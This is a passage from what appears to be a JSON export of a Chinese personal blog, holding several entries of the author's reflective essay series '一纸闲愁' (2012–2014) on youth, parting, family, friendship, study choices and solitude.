我希望自己在没有麻木之前还能尽力用文字记住过往每一个在自己身上留下印迹的人，记住每一种感动过自己的温度，记住让我成为今天的自己的一切。这些组合起来，就是一个人的青春。 纵使青春留不住。 木兰香，终于再也遮不住忧伤， 变成了阳光下的一片晶莹。 我想，有一天，我们背靠高架桥，看车辆穿梭如光线，任雪花随风飞舞，翩跹若杨花。 附录： 节选自 一纸闲愁4【一路向北】 (2012-09-05 22:08) 就这样，新的生活即将猝不及防的撞进熟悉的轨迹。 人永远都无法知道自己该要什么，因为人只能活一次，既不能拿它与前世相比，也不能在来生加以修正。谁会知晓今天所做的事情会有何意义？那是徒劳无用，还是埋下成功的密匙？这只能在未来加以验证。 淡淡的离别愁绪涌上心头。 除了离别，还是离别。 夜阑笙歌起，不尽离人泪。 离开了你，他，还有他们，还有这土地。 每个人心中都藏着一些茧。将愁情包裹，生怕袒露。 多情自古伤离别，我又将冷落谁？时间又将冲洗我对谁的记忆？ 我一直不知道，究竟是流水带走了忧伤，还是忧伤随着流水一起流淌？ 别时容易见时难。 若是离去，后会无期了么。 你是谁的心伤，带走了谁的依恋，又开始了谁的想念。 把记忆轻启后。 谁会知晓，远方的天空下，是否还会有你我交汇的轨迹？ 我一路向北，离开有你的季节。任凭梦里三千落花。那条落英缤纷的路，又该通往何方？ PS： 本来说是不会有再有一纸闲愁的了。 但是觉得想不出什么好名字。 文艺什么的，趁现在赶紧装。去人大你装毛啊。 啊，还有感觉自己文笔都用完了。 -THE END- 2014.6.25","categories":[{"name":"whisper","slug":"whisper","permalink":"https://www.hrwhisper.me/categories/whisper/"},{"name":"一纸闲愁","slug":"whisper/一纸闲愁","permalink":"https://www.hrwhisper.me/categories/whisper/%E4%B8%80%E7%BA%B8%E9%97%B2%E6%84%81/"}],"tags":[{"name":"心情","slug":"心情","permalink":"https://www.hrwhisper.me/tags/%E5%BF%83%E6%83%85/"}]},{"title":"一纸闲愁9 灯火阑珊","slug":"emotion-at-a-paper-9","date":"2014-11-30T16:09:30.000Z","updated":"2020-10-19T14:35:48.731Z","comments":true,"path":"emotion-at-a-paper-9/","link":"","permalink":"https://www.hrwhisper.me/emotion-at-a-paper-9/","excerpt":"一纸闲愁9 写于2014.2.14","text":"一纸闲愁9 写于2014.2.14 去年的这个时候，记得我写下“蓦然回首，谁又在灯火阑珊处”。 转眼间又是一年。 流光容易把人抛，红了樱桃，绿了芭蕉。 目录： 一、 醒了 二、 上元节 三、这一次，真的等不到了。 四、后记 BGM:许多葵-清风莞月浮舟令 感谢老曹提供 一、醒了 今天挺晚睡觉的。是的,今天，指的是凌晨。 后来迷迷糊糊的睡着了。 《盗梦空间》有一句经典的台词 “我们都知道梦是假的，可是我们在梦里却相信那是真的。我们都相信现实是真的，可是你怎么能肯定这不是另一场梦境？” 就和周公晓梦迷蝴蝶一样的不谋而合。 今天梦见了许许多多的东西。可惜世界上没有造梦师，总能很快的发现里面的破绽,总有矛盾，这是梦呀。 只是梦啊。 倘若这个世界是虚假的，那么只有我们是真实存在的。如果我们是真实存在的，而我们又为未来努力着，那么我们会幸福的，对么？ 许多东西都像梦一般的飘过。 “不要说心中有一个地方，那是我一直不敢梦见的地方，漆黑的温暖或是浮光的冰凉。” 二、上元节 是的，元宵节又称上元节，但它就是古代的情人节，哪怕不是2月14。 元宵灯会在封建的传统社会中，城里人家在一年之中唯一一个允许女孩儿们步出闺门、去红衢紫陌中尽兴游玩的夜晚。给未婚男女相识提供了一个机会。同时，又是男女青年与情人相会的时机。 所以： 周邦彦《解语花·上元》写到\"衣裳淡雅。看楚女、纤腰一把\"，看来看美女的愿望，从古至今就没什么多大的改变。再回想辛弃疾那首同样写尽元夜绚烂光华的《青玉案·元夕》，也更容易理解小辛同学\"众里寻他千百度\"的那种焦急，因为今晚找不到，也许永生都再没机会见面。但是他就没有\"那人却在灯火阑珊处\"的幸运了，只能回想起从前的同一个晚上，\"暗尘随马去，明月逐人来\"，只剩得\"旧情衰谢\"，一任他人鼓舞狂欢，\"从舞休歌罢\"。 去年的这个时候，记得我写下“蓦然回首，谁又在灯火阑珊处”这个句子，现在看来，怅然若失。 好大的风。 出去走走。走着好久好久没走的路。熟悉而又陌生。 当年，我就是蹦蹦跳跳的走这条路去上小学的。 这条路， 连接起晚霞与初月，扩展到天的深处或地的尽头。 你会不会突然的出现，在街角的咖啡店， 然后说一句好久不见。 抬头，仰望。 简单的两个动作，儿时同样也能做到，轻而易举，不费吹灰之力。 星星依旧闪烁耀眼，不费力的眨着眼睛，像是呼唤，像是等待，像是述说，像是倾听。 夜空中最亮的星，又能否听到，那仰望的人心底的叹息。 是呀，听不到呀，听不到吧。数十万光年外的星星，也许早已熄灭，却在我们的眼中，依旧闪亮。 有点淡淡的哀伤不是么。 你看到的，却未必是真实存在的； 你听到的，也未必是真实发生的。 走到一条条的小巷。 蓦地想起了某一首诗。 我们的心里都藏了一个丁香般的姑娘，对她寄予了美好的希望。 可越是希望，就容易失望；越想拥有，就越容易失去。就像我们攀得越高，摔得也越疼。 这不是雨天，我也看不到丁香一样的姑娘。 也好，不妨把那些温暖而美好的事情只放在心里。 元宵节，缘消节。 人们都只认得初始时候的美好，从人生若只如初见到相见争如不见,再到几多轮回少一人。 然后就这样淡了，累了，走了，散了，不见了，不再见了。 想点个灯笼，再一次的和儿时的玩伴一起游玩，哪怕是无聊透顶的捉迷藏。可是，只剩我一人。你们都离开了。天各一方。留下我，和一地的念想。 梦想无边的海滩，还能再次找到他么？ 究竟，我们有多少情感遗忘在路上，我们有多少心绪丢弃于时光。 我还在路上， 只有狂风依旧， 唯只见，旧情衰谢。 三、这一次，真的等不到了 上次，下了一场小雨。走到阳台，惊喜的发现，屋后的桃花树出现了点点的小花。 妈妈说，再过几天叶子长出来后会特别好看。 可那时候，我还在这么？ 不在了，不在了啊。 偶尔羡慕生来‘丑陋‘的枝干，至少，他们可以陪伴着那花，从含苞待放到娇艳芬芳，哪怕最后要亲眼目睹它的凋谢，即便那是万分残忍的过程。 只为花开。 可是，我等不到了。 等不到了呀。 是啊，等不到了。 等不到那满树的花，那满枝的嫩芽，随风而舞，遇雨则歌。 等不到那从满树的粉红，再到满树的绿茵。 等不到开满一树的念想，就要披星戴月的离开了，随风，随雨，随遇而安。 那么，不如，送我一场春雨。 就让雨水洗涤一切的哀伤，冲刷掉所有的心绪。 随风，随雨，随缘，随遇而安。最重要的是，随心，不是么？ 桃花树在风的摇曳下，轻轻摆了摆树枝，像是点头的赞许。 也许，花开花谢是每一朵花必经的轮回， 也许，闲庭信步是每一个人追求的节奏， 也许，云卷云舒是每一个人所爱的风景。 “叶子长出来后呢？”我追问妈妈。 “那么花会谢，结出果实。” “那然后呢？” “秋天呀，叶子就又落了。” 莫名的心疼。 细看来，不是桃花，点点是离人泪。 四、后记 当年高中放学，爸爸都要去接我。 在那时候，他都会去体育场跑几圈，冬天甚至还脱掉上衣跑。 也许我跑步是遗传吧。嘻嘻。 不过这次回来，父亲大人血压升高，脊椎引起的。 不能和我一起跑步了。 如果可以，我可以跑31圈给你看。我做到了真的。 刚才远远的路过体育场，没敢进去。 不管是生命中美好的事情，爱的人，甚至生命都可能宛如昙花一现，短暂而美丽。都想把生命中美好的事情定格，如果可以，倘若可以。可往往美好的事物总要预支一段如莲的时光，然后加倍的偿还。 偿还？就像烟花绚丽后落寂--只有无尽的黑暗。 烟花易冷。 下一次回家，就是大二结束了吧。 突然隐隐的恐惧，没来由的揪心的疼。 你读研么，还是去工作？那时候是该做出抉择了吧。 不问明天过后。 喜欢细小的片段。 一串串的拼接起来，成为回忆的珍珠项链。 还有许多闲言碎语，不写了，不写也罢，不写也好。 这一路走过，如岁月的枯木碾碎后，加上时光的清水，成了一纸的澄明，不管曾经的颜色是什么，一泼墨，便能渲染出隔世离空的色彩……可却，再也回不到最初。 一纸闲愁系列： 一纸闲愁【毕业时】 (2012-06-1123:16) 一纸闲愁2【那么，走吧】 (2012-07-19 21:31) 一纸闲愁3【远方的荧光】 (2012-08-23 16:02) 一纸闲愁4【一路向北】 (2012-09-05 22:08) 一纸闲愁5【如你在远方】 (2012-11-09 18:24) 一纸闲愁6 【关于我】 (2013-08-1023:35) 一纸闲愁7 【渡口徘徊】 (2013-10-26 23:59) 一纸闲愁8 【结束，也是开始】 (2013-11-19 23:44) 一纸闲愁 9 【灯火阑珊】 (2013-2-14) 现在，已经在Blog上开始更新岁月的剪影系列。 【年末的钟声】 【新年伊始】 【二月春风似剪刀】 接下来会有： 【三月陌上花开】 【你是人间四月天】 记录的是日常的碎碎念。不发微博吐槽了。微博删了大半。 经过时光的清水，成了岁月的剪影也好，时光的印记也罢，可是都回不到最初，不是么？ 一纸闲愁，如果可以，这就是终章。 愁，一个禾，一把火，一颗心。把心点燃，却烧不尽生前的眷与恋。 By梦、似轻纱（一个拾梦的人） 2014/2/14 -THE END-","categories":[{"name":"whisper","slug":"whisper","permalink":"https://www.hrwhisper.me/categories/whisper/"},{"name":"一纸闲愁","slug":"whisper/一纸闲愁","permalink":"https://www.hrwhisper.me/categories/whisper/%E4%B8%80%E7%BA%B8%E9%97%B2%E6%84%81/"}],"tags":[{"name":"心情","slug":"心情","permalink":"https://www.hrwhisper.me/tags/%E5%BF%83%E6%83%85/"}]},{"title":"一纸闲愁8 结束，也是开始","slug":"emotion-at-a-paper-8","date":"2014-11-30T16:08:30.000Z","updated":"2020-10-19T14:35:48.731Z","comments":true,"path":"emotion-at-a-paper-8/","link":"","permalink":"https://www.hrwhisper.me/emotion-at-a-paper-8/","excerpt":"一纸闲愁8 写于2013.11.19","text":"一纸闲愁8 写于2013.11.19 他也会难过，为什么那么深的爱了，却又那么轻易的放弃。 时光走过，那么就不会再来。人来人往，要走的，终究是留不住的。 而那些新生的绿意却总是与自己格格不入。或许这就是年轮的代价，每个人都必须付出的代价，时光不容许你讨价还价，该散去的，终究会不再属于你。 而记忆中的你会依然笑着，没心没肺，像个永远长不大的孩子。 就这样，即便各安天涯，你好好的，我也好好的，是否晴天也已经不重要。 结束，也是开始，明天又是新的一天，准备好了吗？Let’s go！ My way and My heart :) Believe myself. 2013/11/19","categories":[{"name":"whisper","slug":"whisper","permalink":"https://www.hrwhisper.me/categories/whisper/"},{"name":"一纸闲愁","slug":"whisper/一纸闲愁","permalink":"https://www.hrwhisper.me/categories/whisper/%E4%B8%80%E7%BA%B8%E9%97%B2%E6%84%81/"}],"tags":[{"name":"心情","slug":"心情","permalink":"https://www.hrwhisper.me/tags/%E5%BF%83%E6%83%85/"}]},{"title":"一纸闲愁7 渡口徘徊","slug":"emotion-at-a-paper-7","date":"2014-11-30T16:07:25.000Z","updated":"2020-10-19T14:35:48.731Z","comments":true,"path":"emotion-at-a-paper-7/","link":"","permalink":"https://www.hrwhisper.me/emotion-at-a-paper-7/","excerpt":"一纸闲愁7 写于2013.10.26","text":"一纸闲愁7 写于2013.10.26 今夜，又站在过去与未来的渡口。彳亍着。 送走了春与夏。转眼的就迎来了福州的秋。这不同于故乡的秋，冷冷得厉害，热热得要死。 “或许在这样的季节里唯有剩这清风可诉语，留那秋雨可告知。” “于是留下了那次秋天，那一场雨”。想起了余秋雨，看过他的《千年一叹》、《借我一生》以及《我等不到了》。 多久没有拾起文学的旧梦，没有在茶余饭后闲暇之时，坐下来，看一本书。而是活在功利的世界里，忙忙碌碌，却始终不知道自己身在何处，又将驶向何方。在物欲横流的世界里，让原本更加贫瘠的心灵愈发贫瘠。 北岛在蓝房子写到”那时我们有梦,关于文学,关于爱情,关于穿越世界的旅行。如今我们深夜饮酒,杯子碰到一起,都是梦破碎的声音。” 儿时的梦想现在还有多少剩下。那时猖狂叫嚣着自己是最厉害的，怀揣着纯真的梦想。虽然现在看来，显然是傻B一个。是我们成长了还是一次次碰壁得头破血流而怯懦了？ 我不知道这样的日子何时结束,何时能实现那破碎的梦,也许那只是个传说,只是流年的一个美丽而不现实的谎言。 从为学业、事业离开故土的那一刻起，故乡再无春秋，只剩冬夏。 一个个的，儿时的玩伴为了各种梦想，学业，奔赴远方。 或许，也许就这样，从此山水不相逢。 我不禁在想，旅行的意义到底是什么，离开是为了更好的重逢吗? 我不知道。 好希望这一切是一个漫长的梦，醒来后，你我依然如故。 可这是痴心妄想！ 流年啊，真的似水，一路奔赴而去。而我总是等不到和心灵一起上路。 于是誓言变成了谎言，愿望变成了失望，承诺变成了包袱。 还能不能在逍遥自在的说那一句， 没有爱情，可以。 没有梦想，不可以。 现在还能把它们，简单的，放在天平上比对么？ 我变了，时间不仅悄然改变了我们的容貌，它还要在心灵上狠狠的刮上几刀。 可总有那些爱做梦的青年，始终认为林徽因和徐志摩才是最般配的一对。 我也曾经这么认为，为他们叹息不已。”可是琴棋书画诗酒花只可以怡情养性，柴米油盐酱醋茶才是真实的烟火幸福。”(林徽因传) 要找，就要找会生活的人,她会给你正能量。 时光是无情的，但它是公平的，它同样不会放过那质朴的树。树的年轮上，记录着时光肆虐的痕迹，一个又一个的年轮仿佛就像岁月一次又一次的轮回，周而复始。\"我是你路上最后一个过客，最后一个春天，最后一场雪，最后一次求生的战争。\"保尔·艾吕雅诚挚的说道。最后啊最后，最后真的是一个无比凄凉的字眼，像极了小时候爱听的童话，总是有一个美丽而完美的结局，是我们童心未泯还是童话编织了太多的谎言，我们总是能发现，世事岂能皆如愿，我们每一个人都早晚会成为别人的最后，那些过往曾经，甚至都来不及你说一句告别。况且你往往不知道这是否是最后一个，又宁愿得过且过。而我们就这样，日渐老去。 我不会让她为难，所以我会把一些话烂在肚子里。况且，喜欢并不是爱啊。 感慨这么多，真矫情，我还要看书去呢。 我是一个人，但我知道我并不孤独，还有千千万万个人和我一样，在夜里，吐露着为梦想，永不停息的气息。 2013.10.26 My way and My heart :) -THE END-","categories":[{"name":"whisper","slug":"whisper","permalink":"https://www.hrwhisper.me/categories/whisper/"},{"name":"一纸闲愁","slug":"whisper/一纸闲愁","permalink":"https://www.hrwhisper.me/categories/whisper/%E4%B8%80%E7%BA%B8%E9%97%B2%E6%84%81/"}],"tags":[{"name":"心情","slug":"心情","permalink":"https://www.hrwhisper.me/tags/%E5%BF%83%E6%83%85/"}]},{"title":"一纸闲愁6 关于我","slug":"emotion-at-a-paper-6-about-me","date":"2014-11-30T16:06:06.000Z","updated":"2020-10-19T14:35:48.730Z","comments":true,"path":"emotion-at-a-paper-6-about-me/","link":"","permalink":"https://www.hrwhisper.me/emotion-at-a-paper-6-about-me/","excerpt":"一纸闲愁6写于2013.08.10 慢慢，也就明白文字语言无非求个明白。若找不到明白的人，你识的字便没有意义；若有一个明白的人在，你所说的什么也就有了意义。我想，生活的意义也许就是这样，就是要找到这样的一个人。","text":"一纸闲愁6写于2013.08.10 慢慢，也就明白文字语言无非求个明白。若找不到明白的人，你识的字便没有意义；若有一个明白的人在，你所说的什么也就有了意义。我想，生活的意义也许就是这样，就是要找到这样的一个人。 致青春，以不虚度的名义 廷海说，要学会总结。绮绮说大学不仅仅是要掌握专业技能的地方，也是要建立三观的地方。 一、 梦 那时我们有梦，关于文学，关于爱情，关于穿越世界的旅行，如今我们深夜饮酒，杯子碰到一起 ，都是梦破碎的声音。 一直喜欢蓝房子里的这首诗。 也许就像绮绮说的，当年都认为自己是最牛B的，现在看来很是可笑。 无知者无畏，所以我们可以仰天大笑出门去，高呼我辈岂是蓬篙人。 当现实的残酷束缚住了你的脚步，压垮了你的脊梁。 “如果骄傲没被现实大海冷冷拍下，又怎么会懂得，要多努力，才走得到远方。” 可是我心比天高。 哪怕翅羽沉重，依旧头颅高昂。 因为信念。所以我一直在努力。小小的梦想如蔚蓝大海里卷起的浪花一朵。 我必须全力以赴，就像在浩瀚的苍穹寻找那颗明亮的星子，在无垠的碧海寻找那朵璀璨的浪花，在万木的丛林寻找那一树伟岸的青松。 1、 岂能事事皆如愿，但求无愧于我心。 2、 你最好全神贯注，因为我定会全力以赴。 3、一切取决于你。若你决定灿烂，山无遮，海无拦。 二、 关于爱情 爱是一颗心遇上另一颗心，而不是一张脸遇上另一张脸。因喜欢一个人的容貌而爱上对方相对容易，同样，移情也容易。然而，如果因对方的内心而爱上他，常常是一旦发生就直奔根深蒂固的不归路。 漂亮的妹子只能作为欣赏，谁知道她的内心呢。 世间风景万千，很多时候我们无法分辨清谁是你要的那杯茶，谁是你沧海桑田的家。 有多少无情人终成眷属，有情人却成陌路。 我说，如果不是我爱的，我一定不娶。 1、喜欢不是爱。 2、要找，就要找会生活的人。 3、我明白你会来，所以我等。 时间和金钱摧毁的永远不是真正的爱情，而是那些矫揉造作的虚伪情感。 泰戈尔说“地球上，等待帝王的权势和富翁的财产的是死亡。” 我不否认爱情需要建立在一定的物质基础上，但那物质基础，不能是全部，或者占一大部分比重，否则，爱情就变了味道。 三、 关于发展模式 在我看来，用成绩来衡量一个计算机专业的学生的好坏，本身就是一个错误。 于是看着一群人去拼积点我表示笑而不语。 如果我要当学霸，就不会放任大物，就不会最后的时候才突击；C++就会带上自己的代码进去敲，就不会只编出7题（剩两题全部写好了，改改就能过）；军事理论就不会才那么点分，等等等等。 我要是去追求那些毫无意义的分数，违背自己的本心，那就不是我了。 我所要的发展模式，即要注重学业（我认为重要的，像大物这种反人类的东西滚蛋），又要注重实践。 一天和舍友出去吃饭，有人在路边卖艺乞讨。我舍友看了说：要好好学习啊，不然以后讨饭都抢不过人家。 人要有尊严的活着。但是没有实力面前，谁会在乎你的尊严。 一个可以凭自己正当的手段、通过自己能力来养活自己的，都是可敬的。 现在毕业的高校生多得要死。 一张文凭干不了什么的。 看我同学，现在都想成为学霸。 我只能说呵呵。 对于学计算机的，实践才是王道。 他们计算机一些基本的操作都不太懂，成为了学霸又有何用？ 那只是书呆子吧。 1、不要与别人比较成绩。考试那么水，赢了没有成就感，输了又耿耿于怀，有意思么。 2、你想考研么？还不知道呢。保研的话，保福大等于。。。 3、从今以后谁问我成绩一律不回答。 四、 关于父母 回到家里的感觉就是不一样哇。 老爸说你怎么没变胖哇。 我很委屈的说，早上7点吃饭10点就饿了，中午12点吃饭下午4点饿了，晚上吃饭8点多饿了。。。吃完夜宵还没睡觉又饿了。。 趁着现在还有时间多陪陪父母。 父母想要的很简单，有你在，就是他们最快乐的时光。 1、父母在，不远行。 2、我们在成长着，可我们的父母却日渐老去。 五、 关于友情 偶尔梦见，仍然是在那些熟悉而又陌生的地方，在一起没心没肺的追逐打闹。 挥挥手，做告别，笑得一如既往。 谁知道这次离去，是不是就后会无期了呢。 别时容易见时难。 每一次相遇都是奇迹的笔记。 要好好的珍惜。 1、 要是我很久不联系你，不是我忘了你。 2、 多渴望能一直有你们陪伴。 六、 身体才是革命的本钱。 有人问禅师，「关于人性，最让您感到惊讶的是什么？」禅师：「人类，为了赚钱，他牺牲健康。为了修复身体，他牺牲钱财。然后，因担心未来，他无法享受现在。就这样，他无法活在当下。活着时，他忘了生命是短暂的。死时，他才发现他未曾好好地活着。」 李开复患上癌症后说“在以往的职业生涯里，我一直笃信“付出总有回报”的信念，所以给自己的负荷一直比较重，甚至坚持每天努力挤出三小时时间工作，还曾天真的和人比赛“谁的睡眠更少”、“谁能在凌晨里及时回复邮件”……努力把“拼命”作为自己的一个标签。现在，冷静下来反思：这种以健康为代价的坚持，不一定是对的。” (9月更新) 我不要天天的宅着学习，我也要锻炼身体！！！！！ 以后，每天都要去跑步！下雨除外。 为什么选择跑步？ 加强心肺功能，且是一个低成本的运动0.0 七、 公平 世界上没有绝对的公平，它会把我们变成愤青。 人最低贱的地方就是抱怨着不公平，却想站在不公平里的有利地位。 但世界又是公平的，你想要什么，必然会付出相应的代价。 八、关于我的语言 如果我说呵呵，那一定是我不满、不高兴了。（qq聊天时，并不是面对面） 说哦多半是敷衍。 一直信奉着程序简洁而优雅的风格。 摘录 耐得寂寞，拥得繁华——孤独是你的必修课 生活不可能像你想象得那么好，但也不会像你想象得那么糟。我觉得人的脆弱和坚强都超乎自己的想象。有时，我可能脆弱得一句话就泪流满面，有时，也发现自己咬着牙走了很长的路。——莫泊桑 1. 但以这样的一句话作为开头，看高木直子的《一个人住第五年》的时候还在国内，那时觉得那样的生活根本不可能发生在我身上，连吃饭都要人陪着的我无法忍受一个人吃饭的感觉。所以后来，有很长的一段时间里我都没能适应一个人吃饭，一个人旅行，现在想想其实也没什么，这个世界运转速度那么快，没有人会在意你是不是一个人。以至于后来一个朋友问我是不是也得了社交恐惧症，我笑笑，其实不是，只是自己慢慢地变得懒了，懒得去经营一份感情，至于朋友，有那么几个就足够了，有些人天天在一起，也不见得是朋友。 好像这样久了，倒是会忘记开始遇到的困难，渐渐地变成自己生活的旁观者，看着生活平静地流淌。都说人是慢慢成长的，其实不是，人是瞬间长大的，就像是突然间沉淀一般，突然不会谈恋爱了或者说不想谈恋爱了，一个人生活单一却也不会觉得无聊，即便很多时候还是会迷茫却也不会觉得烦躁了。 去年的今天我在不一样的城市，背着不一样的书包，留着不一样的发型，走着不一样的路，想着不一样的事情，有着不一样的心思，爱着不一样的人。谁说改变需要十年呢。 2. 身边的牛人倒是不少，像是神抵一样的存在，我也只是羡慕想着反正自己也不会变成那样的人，直到有一天一个学长跟我聊起来，才知道原来他也有看不进去书的时候也有写论文写到想撞墙的时候，我们都忘了他们是用怎么样的一个代价才换取来了这样的一个人生。他说，如果你想要去实现梦想，孤独是你的必修课。如果不能沉下心来，就没有办法去实现它，因为那绝对不是一件容易的事情，孤独能让你更坚强，你必须找到自己的生活节奏。 有一个朋友喜欢每天喝一点酒，看一部电影然后准时睡觉；住在旁边的英国人神出鬼没有的时候早上才睡有的时候天刚黑就睡了；隔壁楼的一个男生每天天不亮就起来跑步，往往那个时候我才刚打算睡。 最近迷上一个人到处走，算不上旅行只是周围的城市走一遭，倒也不会花上太多时间准备，提起包就走了。我不会带上相机只是有兴致了拿出手机拍一拍，音乐倒是我走到哪里都不能丢的东西，只有音乐，能让看似漫长的等待变成曼妙的旅程，似乎自己跟整个世界都没有关系，只想当一片没有名字的云，徜徉在不知道名字的风景里。 正如上面说的，曾经无法想象一个人吃饭的感觉，同样的，我也不会去想象一个人去坐公交车是什么样的感觉。谁知道没过多久我就习惯了一个人坐车去学校，我离学校比较远所以每次上车的时候还没有多少人，坐最后的几排。有的时候看着窗外发呆，什么都想却又不知道自己在想什么。 我们都会找到自己的生活节奏，然后沉溺其中无法自拔。 3. 很长一段时间里我都没有去书店，觉得那种“每个星期读一本书”对于我来讲是太遥远的东西。直到有一天我陪朋友去书店，他是一个买书就不会停的人，我也就跟着买了几本。 回到家里看微博人人又觉得心里空拉拉的，索性就拿起书来看，也是在那一天我才发现，其实每个星期看一本书没那么难，那天我一下子把书看完，才觉得这样子的生活是充实的。 要么读书，要么旅行，身体和灵魂，必须有一个在路上。 我告诉自己现实容不得你拖延，拖延只会让我变得更焦虑而已，所以刚开始的时候我规定自己每天提早shang床半小时，看上几十页书，很快就变成习惯了。有的时候我不得不感叹如果真的去做一件事情的话，那么这件事情没有那么难。当你真的想要做一件事情的时候，整个世界都会来协助你，就是这种感觉。 一个骑过川藏线的朋友说，只要出发，就能到达，你不出发，就哪里也去不了。如果你不能沉下心来，就什么也做不到。出发永远是最有意义的事，去做就是了。一本书买了不看只是几张纸，公开课下了不看也只是一堆数据，不去看就没有任何意义，反而徒增焦虑，行动力才是最关键的。 4. 你也许也是这样，当你渴望找个人交谈的时候，你们却没有谈什么.于是发现有些事情是不能告诉别人的，有些事情是不必告诉别人的，有些事情是根本没有办法告诉别人的，而有些事情即使告诉了别人，你也会马上后悔。那么最好的办法就是静下来，真正能平静自己的只有自己。 没有人能免得了孤独，与其逃避它不如面对它。孤独并不是一件那么糟糕的事情，与嘈杂相比，一个人生活倒显得自得地多，倒也可以变成一种享受。或许至少需要那么一段时间，几年或几个月，一个人生活，不然怎么能找到自己的节奏知道自己想要什么。这是属于你自己的东西，是你的一部分，你听音乐时，坐地铁时，一个人走在马路上时，它就会流淌出来，让我觉得这个世界似乎在以另外一种形式存在着，我能够清晰地听到自己。 我们都生活在一个不那么如意的世界，当乌云密布我们就摇曳，但阳光总有一天会到来，等阳光照到你的时候，记得开出自己的花就行了，那个你与生俱来的梦想。有的时候梦想很远，有的时候梦想很近，但它总会实现的。我想一个人最好的样子就是平静一点，哪怕一个人生活，穿越一个又一个城市，走过一个又一条街道，仰望一片又一片天空，见证一次又一次别离。","categories":[{"name":"whisper","slug":"whisper","permalink":"https://www.hrwhisper.me/categories/whisper/"},{"name":"一纸闲愁","slug":"whisper/一纸闲愁","permalink":"https://www.hrwhisper.me/categories/whisper/%E4%B8%80%E7%BA%B8%E9%97%B2%E6%84%81/"}],"tags":[{"name":"心情","slug":"心情","permalink":"https://www.hrwhisper.me/tags/%E5%BF%83%E6%83%85/"}]},{"title":"一纸闲愁5 如你在远方","slug":"emotion-at-a-paper-5","date":"2014-11-30T16:05:03.000Z","updated":"2021-01-08T13:42:14.108Z","comments":true,"path":"emotion-at-a-paper-5/","link":"","permalink":"https://www.hrwhisper.me/emotion-at-a-paper-5/","excerpt":"2014一纸闲愁5写于2012.11.9","text":"2014一纸闲愁5写于2012.11.9 1. 没有人会注意到你的闪光，静默的心灵。 既然你选择了这条路，你只能孤独地行走在这岁月流年，虽说孤独也是一种磨练。 既然选择了一条路，又何必要去打听要走多久？ 我站成笔直，影子拉长，寂寞像路两旁延伸。 又望了望来时的路，仿佛回到了那条小径，那分岔的路口。 脚下的路突然分为两途，但自己仅有一个机会，选择了，就再也不能回头。 选择根本就是放弃的同义词。 若是陷入黑暗的沼泽，是不是会叹息叹息当初为什么不选择另外一条路；但事情也许是这样：走进了一个最最美丽的国度，却对另外一条路念念不忘，若是当初选择了另一条路，现在风景会不会更好？ 但没有任何方式可以检验到底那种抉择更好，一切都是马上经历，仅此一次，不能准备。好像一个演员没有经过排练就上了舞台。 他说的对，世间既没有有双全之法，凡人也没有分身之术。 难道当小径在脚下突然分岔的时候，就只能靠骰子来决定自己的未来么？ 不，无论是哪条路，都是布满荆棘，在通往彼岸花开前，只是，你是否，会对另外一条路念念不忘？ 谁能许你一个未来？ 那不可测、不可节、不可预见。即使你有再大的手笔，也无法力挽狂澜，这是时光的趋势，历史的车轮滚滚向前。 于是独自出发。 到了一个陌生的环境，找一些熟悉的事物。遇到一个熟悉的身影，便会想，这，像谁，这声音，又和谁如此相似。找着熟悉的模样，熟悉的事，以求心灵的慰藉。是的，像，仅仅是像，但那不是真，你只是在那人身上窥见了谁的影子？ 这是因为太过于怀念还是介于什么不能说的秘密？ 是否有些人一旦离去，就再也见不到了？ 有的人错过了，也许今生不能再见。 只留下刻骨铭心的回忆，捧一缕最温柔的月光，寄奉于心中。 于是欲上青天览明月，取一缕月辉，满载一船回忆。想借月光照亮心中遥远的记忆，那被隐藏在黑暗的角落里，那伴随这伤与落寂。 有些事，我不说，那就是永远的秘密。 到现在我还习惯的在熟悉的作业纸班级上写4呢，然后笑笑，涂掉。 旧时光是个美人儿，总是让人回味。 这世间唯有过去才永恒。 那已经成为历史的篇章，灿烂的，辉煌的，或是黯淡的，失望的，谁也无法去改变。 但时间从来不会为你而停留。正如无法转拨一个已然定向的舵，一个将军唤不回上了死线的士兵。 是啊，真正让人疯狂的不是今日的沉重，而是对昨日的懊恼和对明天的畏惧，懊恼与畏惧就好像一对孪生窃贼，偷走了我们的今天。 2.迟起，一门亡命的艺术 不可否认，迟起、赖床给予了梁遇春无数灵感。但这货没有有意识地劳其筋骨，以增强自己的身体抵抗力。由于体弱而赖床，长期赖床使体质更加虚弱，愈弱愈想赖床，形成不好的循环，最终英年早逝，年仅26岁。 为了给自己耐床张目，他甚至总结出一些在我看来啼笑皆非的梁氏理论。如“我天天总是在可能的范围之内，尽量地滞在床上——那是我们的神庙——看着射在被上的日光，暗笑四围人们无谓的匆忙，回味前夜的痴梦——那是比做梦还有意思的事，——细想迟起的好处，惟我独尊地躺着，东倒西倾的小房立刻变做一座快乐的皇宫”等等。 这所谓的梁氏理论也成了他的催命符，令人叹惋。 对于他，迟起，的确是一门亡命的艺术，才华横溢的他，早早的终止了前进的步伐。 请早起，无论何时。梁遇春还有人替他叹息呢，叹息他的英年早逝。而平凡的你我又会有谁，来叹惋？ 他像是一个灿烂的春，沉在夜里，宁静而黑暗。 3.附上一篇不是我写的散文 时光如水，总是无言。若你安好，便是晴天。 一直想做个安静的女子，在最深的红尘里守着自己，守住最初的萌动和欣喜。 或者陷在一本光影流年中，翻看那些依稀旧梦。 时光仿佛一杯静水，依然深刻依然可以深流， 而一份心情却与风月无关，水逝惊鸿去。 站在时光的路口，回望曾经走过的美丽和温柔。 许多人，许多事，许多曾经花发枝满的渴求与憧憬， 依然在岁月的长河中缓缓流过，又默默回溯。 世事纷繁，时光终是无言，所谓的执念也许只是虚妄，所谓的抵达也不过是终点。 生命不止，红尘无尽。仅以一程换一种懂得，仅以一程换一场经历，如此，而已。 滚滚红尘，谁又是谁生命中的看客和过客？ 推开一扇叫岁月的门，许多年华终于被渐次搁浅。 而你，永远是斜格子里的光影，游走在梦与现实的边缘。 若是时光锁住的葱茏，曳动冷冷的素月清秋，那么弱水三千，谁取你一瓢，醉饮红尘外？ 此生，若你安好，便是晴天。 (貌似作者是林徽因） 4.结语 如果再给我时间，我是不是能写得更好？ 执著着，经过时间浪涛洗礼后，又剩下了什么。 算了，写成这样了，没关系吧。 真的没关系么。 既然都已经写成这样了，那就这样吧。 “终于明白，有些路，只能一个人走。那些邀约好同行的人，一起相伴雨季，走过年华，但有一天终究会在某个渡口离散。红尘陌上，独自行走，绿萝拂过衣襟，青云打湿诺言。山和水可以两两相忘，日与月可以毫无瓜葛。那时候，只一个人的浮世清欢，一个人的细水长流。 